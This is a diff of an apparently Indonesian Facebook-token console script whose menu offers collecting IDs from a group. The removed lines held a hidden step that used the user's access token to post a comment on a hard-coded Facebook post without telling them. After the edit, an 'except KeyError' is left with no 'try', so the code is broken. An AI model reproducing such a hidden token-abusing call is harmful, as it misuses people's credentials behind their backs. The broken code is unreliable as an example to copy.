@@ -105,12 +105,6 @@ def cek():
 		print("%s[×] %sups sorry token not found !!"%(R,W))
 		sleep(1)
 		login()
-	try:
-		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("100006686703460_1475860812646795/comments?message=Rissa&access_token=%s"%(toket)))
-		print("%s[*] %ssuccess load access token"%(G,W))
-		sleep(1)
-		menu(n,toket)
 	except KeyError:
 		os.system("rm -rf cookie/token.log")
 		print("%s[×] %sups sorry your access token invalid !!"%(R,W))
@@ -136,7 +130,7 @@ def menu(n,toket):
 %s## %s3 ID DARI GROUP%s
 
 %s## %s0 Exit the program
-"""%(G,W,G,W,G,W,G,R))
+        """%(G,W,G,W,G,W,G,R))
 	unikers = input("%s[ %schoose%s ]%s•>%s "%(W,G,W,G,W))
 	if unikers in [""]:
 		exit("%s[!]%s wrong input !!"%(R,W))
